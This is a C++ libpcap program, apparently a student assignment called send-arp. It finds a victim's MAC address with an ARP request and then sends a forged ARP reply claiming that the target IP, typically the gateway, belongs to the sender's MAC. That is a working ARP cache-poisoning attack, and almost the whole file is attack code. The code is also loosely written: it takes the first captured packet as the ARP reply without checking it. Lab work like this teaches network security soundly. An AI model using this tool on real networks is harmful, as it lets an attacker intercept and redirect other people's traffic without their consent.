#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <linux/if.h>
#include <string.h>
#include <arpa/inet.h>

#define ARP 0x0806
#define REQUEST 1
#define REPLY 2
#define MACSIZE 6

#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)


EthArpPacket packet;
char myIp[18];
char myMac[6];


void usage() {
   printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
   printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void getMyIp(char* dev, char* myip) {
   struct ifreq ifr;
   char ipstr[40];
   int s = socket(AF_INET, SOCK_DGRAM, 0);
   strcpy(ifr.ifr_name, dev);
   if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
      printf("getMyIp Error");
   else{
      inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
      memcpy(myip, ipstr, strlen(ipstr));
   }
   printf("my IP address: %s\n", myip);
}

void getMyMac(char* dev, char* mymac) {
   struct ifreq ifr;
   int sockfd, ret;
   sockfd = socket(AF_INET, SOCK_DGRAM, 0);
   if(sockfd <0)
      printf("Fail to get MAC address");
   strncpy(ifr.ifr_name, dev, IFNAMSIZ);
   ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
   if(ret<0)
      printf("Fail to get MAC address");
   sprintf(mymac, "%02x:%02x:%02x:%02x:%02x:%02x",
                        (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
   printf("my MAC address: %s\n", mymac);
}

void sendArp(pcap_t* handle, int op, char* eth_smac, char* eth_dmac, char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip) {
   if(op==REQUEST)
      packet.arp_.op_ = htons(ArpHdr::Request);
   else if(op==REPLY)
      packet.arp_.op_ = htons(ArpHdr::Reply);
   else printf("op error");
   packet.eth_.dmac_ = Mac(eth_dmac);
   packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));
   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0)
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   printf("send arp from '%s' to '%s'\n",arp_sip,arp_tip);
   return;
}

Mac getYourMac(pcap_t* handle, char* mymac, char* myip, char* yourip) {

   char broad_yourmac[20]= "ff:ff:ff:ff:ff:ff";
   char unknown_mac[20]= "00:00:00:00:00:00";
   while (true){
      sendArp(handle,1,mymac,broad_yourmac,mymac,myip,unknown_mac,yourip);
      struct pcap_pkthdr* header;
      const u_char* next_packet;
      int res = pcap_next_ex(handle, &header, &next_packet);
      EthArpPacket* real_packet= (EthArpPacket*)next_packet;
          return real_packet->arp_.smac();
   }
}

int main(int argc, char* argv[]) {
   if (argc < 4) {
      usage();
      return -1;
   }
   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }
   EthArpPacket packet;
   getMyIp(dev,myIp);
   getMyMac(dev,myMac);
   Mac yourmac = getYourMac(handle,myMac,myIp,argv[2]);
   printf("your MAC address: %s\n",std::string(yourmac).data());
    EthArpPacket packet2;
        packet2.eth_.dmac_ = yourmac;
    packet2.eth_.smac_ = Mac(myMac);
    packet2.eth_.type_ = htons(EthHdr::Arp);

    packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet2.arp_.pro_ = htons(EthHdr::Ip4);
    packet2.arp_.hln_ = Mac::SIZE;
    packet2.arp_.pln_ = Ip::SIZE;
    packet2.arp_.op_ = htons(ArpHdr::Reply);
    packet2.arp_.smac_ = Mac(myMac);
    packet2.arp_.sip_ = htonl(Ip(argv[3]));
    packet2.arp_.tmac_ = yourmac;
    packet2.arp_.tip_ = htonl(Ip(argv[2]));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }





   pcap_close(handle);
}

/*
int main(int argc, char* argv[]) {
   if (argc != 2) {
      usage();
      return -1;
   }

   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }

   EthArpPacket packet;

   packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
   packet.eth_.smac_ = Mac("08:00:27:07:b2:a9");
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.op_ = htons(ArpHdr::Request);
   packet.arp_.smac_ = Mac("08:00:27:07:b2:a9");
   packet.arp_.sip_ = htonl(Ip("192.168.35.171"));
   packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
   packet.arp_.tip_ = htonl(Ip("192.168.35.1"));

   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0) {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }

   pcap_close(handle);
}
*/
